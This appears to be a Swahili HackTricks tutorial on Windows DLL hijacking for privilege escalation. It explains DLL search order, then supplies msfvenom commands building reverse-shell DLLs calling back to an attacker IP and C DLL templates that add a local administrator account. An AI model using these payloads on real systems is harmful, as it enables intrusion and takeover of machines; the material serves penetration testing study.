# Dll Hijacking

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ikiwa una nia ya **kazi ya udukuzi** na kudukua yasiyodukuzika - **tunakaribisha!** (_inahitajika kuwa na uwezo wa kuandika na kuzungumza Kipolishi kwa ufasaha_).

{% embed url="https://www.stmcyber.com/careers" %}

## Taarifa Msingi

Dll Hijacking inahusisha kudanganya programu iliyoaminika kuweka DLL mbaya. Kauli hii inajumuisha mikakati kadhaa kama vile **DLL Spoofing, Injection, na Side-Loading**. Inatumika kwa kiasi kikubwa kwa utekelezaji wa nambari, kufikia uthabiti, na, kwa nadra, kuongeza mamlaka. Ingawa umakini unazingatia kuongeza mamlaka hapa, njia ya kudanganya inabaki kuwa sawa kwa malengo yote.

### Njia za Kawaida

Njia kadhaa hutumiwa kwa Dll Hijacking, kila moja ikiwa na ufanisi wake kulingana na mkakati wa kupakia DLL wa programu:

1. **Kubadilisha DLL**: Kubadilisha DLL halisi na ile mbaya, kwa hiari kutumia DLL Proxying kuweka utendaji wa DLL halisi.
2. **Dll Search Order Hijacking**: Kuweka DLL mbaya katika njia ya utafutaji mbele ya ile halali, kwa kufaidika na muundo wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL mbaya ambayo programu itapakia, ikidhani ni DLL inayohitajika ambayo haipo.
4. **DLL Redirection**: Kubadilisha vigezo vya utafutaji kama vile `%PATH%` au faili za `.exe.manifest` / `.exe.local` ili kuongoza programu kwenye DLL mbaya.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na ile mbaya katika saraka ya WinSxS, njia mara nyingi inayohusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL mbaya katika saraka inayodhibitiwa na mtumiaji pamoja na programu iliyohamishiwa, ikifanana na mbinu za Binary Proxy Execution.

## Kupata Dlls Zilizokosekana

Njia ya kawaida ya kupata Dlls zilizokosekana ndani ya mfumo ni kwa kukimbia [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka kwa sysinternals, **kwa kuweka** **filters 2 zifuatazo**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

na kuonyesha tu **File System Activity**:

![](<../../.gitbook/assets/image (314).png>)

Ikiwa unatafuta **dlls zilizokosekana kwa ujumla** unaweza **kuacha** hii ikifanya kazi kwa **sekunde kadhaa**.\
Ikiwa unatafuta **dll iliyokosekana ndani ya programu fulani** unapaswa kuweka **filter nyingine kama "Process Name" "contains" "\<jina la programu>", kuitekeleza, na kuacha kurekodi matukio**.

## Kutumia Dlls Zilizokosekana

Ili kuongeza mamlaka, nafasi nzuri tunayo ni kuweza **kuandika dll ambayo mchakato wa mamlaka atajaribu kupakia** katika **mahali ambapo itatafutwa**. Kwa hivyo, tutaweza **kuandika** dll katika **folda** ambapo **dll inatafutwa kabla** ya folda ambapo **dll halisi** iko (kisa cha kushangaza), au tutaweza **kuandika kwenye folda fulani ambapo dll itatafutwa** na dll **halisi haipo** kwenye folda yoyote.

### Utaratibu wa Utafutaji wa Dll

Unaweza kuona **utaratibu wa utafutaji wa DLL kwenye mifumo ya 32-bit** hapa chini:

1. Saraka ambayo programu ilipakia.
2. Saraka ya mfumo. Tumia kazi ya [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) kupata njia ya saraka hii.(_C:\Windows\System32_)
3. Saraka ya mfumo ya 16-bit. Hakuna kazi inayopata njia ya saraka hii, lakini inatafutwa. (_C:\Windows\System_)
4. Saraka ya Windows. Tumia kazi ya [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) kupata njia ya saraka hii.
1. (_C:\Windows_)
5. Saraka ya sasa.
6. Saraka zilizoorodheshwa kwenye mazingira ya PATH. Tafadhali kumbuka kuwa hii haijumuishi njia ya kipekee ya programu iliyotajwa na ufunguo wa usajili wa **App Paths**. Ufunguo wa **App Paths** hauna matumizi wakati wa kuhesabu njia ya utafutaji wa DLL.

Hiyo ndiyo utaratibu wa **default** wa utafutaji na **SafeDllSearchMode** imeamilishwa. Wakati inapatikana, saraka ya sasa inapanda hadi nafasi ya pili. Ili kulemaza kipengele hiki, tengeneza thamani ya usajili ya **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na weka kuwa 0 (chaguo-msingi ni kuwezeshwa).

Ikiwa [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) inaitwa na **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, utafutaji unaanza katika saraka ya moduli ya kutekelezwa ambayo **LoadLibraryEx** inapakia.

Hatimaye, kumbuka kuwa **dll inaweza kupakiwa ikionyesha njia kamili badala ya jina tu**. Katika kesi hiyo, dll hiyo **itaendelea kutafutwa katika njia hiyo** (ikiwa dll ina dependensi yoyote, itatafutwa kama ilivyopakiwa tu kwa jina).

Kuna njia nyingine za kubadilisha njia za utafutaji lakini sitaelezea hapa.
#### Mifano ya kipekee kwenye utaratibu wa utafutaji wa DLL kutoka kwenye nyaraka za Windows

Mifano fulani ya kipekee kwenye utaratibu wa kawaida wa utafutaji wa DLL imeelezewa katika nyaraka za Windows:

- Wakati **DLL ambayo inashiriki jina na ile tayari imepakia kwenye kumbukumbu** inakutwa, mfumo hupuuza utaratibu wa utafutaji wa kawaida. Badala yake, hufanya ukaguzi wa upakiaji upya na kielelezo kabla ya kutumia DLL iliyopo kwenye kumbukumbu. **Katika hali hii, mfumo haufanyi utafutaji wa DLL**.
- Katika hali ambapo DLL inatambuliwa kama **DLL inayojulikana** kwa toleo la sasa la Windows, mfumo utatumia toleo lake la DLL inayojulikana, pamoja na DLL zake zinazohitajika, **bila kufanya utaratibu wa utafutaji**. Kitufe cha usajili **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** kinashikilia orodha ya DLL hizo zinazojulikana.
- Ikiwa DLL ina **tegemezi**, utafutaji wa DLL hizo tegemezi hufanywa kama vile zimeonyeshwa tu kwa kutumia **majina ya moduli**, bila kujali ikiwa DLL ya awali iligunduliwa kupitia njia kamili.

### Kuongeza Mamlaka

**Mahitaji**:

- Tambua mchakato ambao unafanya kazi au utafanya kazi chini ya **mamlaka tofauti** (harakati za usawa au pembezoni), ambao **haujamiliki DLL**.
- Hakikisha kuna **ruhusa ya kuandika** inapatikana kwa **folda yoyote** ambapo **DLL** itatafutwa. Mahali hapa inaweza kuwa folda ya kutekelezwa au folda ndani ya njia ya mfumo.

Ndio, mahitaji haya ni ngumu kupata kwa sababu **kwa chaguo-msingi ni ngumu kupata faili ya kutekelezwa yenye mamlaka ikikosa DLL** na ni **zaidi ya kawaida kuwa na ruhusa ya kuandika kwenye folda ya njia ya mfumo** (kwa chaguo-msingi huwezi). Lakini, katika mazingira yaliyopangwa vibaya, hii inawezekana.\
Ikiwa una bahati na unakidhi mahitaji, unaweza kuangalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Hata kama **lengo kuu la mradi huu ni kukiuka UAC**, unaweza kupata huko **PoC** ya Dll hijaking kwa toleo la Windows unaloweza kutumia (labda tu kubadilisha njia ya folda ambapo una ruhusa ya kuandika).

Tafadhali kumbuka kuwa unaweza **kuchunguza ruhusa zako kwenye folda** kwa kufanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za folda zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia uingizaji wa faili ya kutekelezwa na kuuza kwa dll kwa:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili juu ya jinsi ya **kutumia Dll Hijacking kuongeza mamlaka** na ruhusa ya kuandika kwenye **folda ya Njia ya Mfumo**, angalia:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Zana za Otomatiki

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) itachunguza ikiwa una ruhusa ya kuandika kwenye folda yoyote ndani ya njia ya mfumo.\
Zana zingine za otomatiki za kuvumbua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Ikiwa utapata hali inayoweza kudukuliwa, moja ya mambo muhimu sana ya kufanikiwa kudukua ni **kuunda dll ambayo inaunda angalau kazi zote ambazo programu itaagiza kutoka kwake**. Walakini, kumbuka kuwa Dll Hijacking inakuja kwa manufaa ili [kuongeza kutoka kiwango cha Uaminifu wa Kati hadi Juu **(kipuuzi cha UAC)**](../authentication-credentials-uac-and-efs.md#uac) au kutoka **Kiwango cha Juu hadi SYSTEM**. Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa kudukua dll uliozingatia kudukua dll kwa utekelezaji: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata **mifano ya msingi ya dll** ambayo inaweza kuwa na manufaa kama **templeti** au kuunda **dll na kazi zisizohitajika zilizosafirishwa**.

## **Kuunda na Kukusanya Dlls**

### **Dll Proxifying**

Kimsingi, **Dll proxy** ni Dll inayoweza **kutekeleza nambari yako ya hatari wakati inapakia** lakini pia **kuonyesha** na **kufanya kazi** kama **inavyotarajiwa** kwa **kupeleka wito wote kwa maktaba halisi**.

Kwa kutumia zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus), unaweza **kuonyesha programu na kuchagua maktaba** unayotaka kuweka kama proxy na **kuunda dll iliyopewa** au **kuonyesha Dll** na **kuunda dll iliyopewa**.

### **Meterpreter**

**Pata rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (sikuona toleo la x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Tambua kwamba katika visa kadhaa Dll ambayo unakusudia lazima **itoe kazi kadhaa** ambazo zitapakiawa na mchakato wa mwathiriwa, ikiwa kazi hizi hazipo **faili ya binary haitaweza kuzipakia** na **jaribio litashindwa**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Marejeo
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ikiwa una nia ya **kazi ya kuhack** na kuhack mambo yasiyohackiki - **tunatafuta wafanyakazi!** (_uwezo wa kuandika na kuzungumza Kipolishi vizuri unahitajika_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
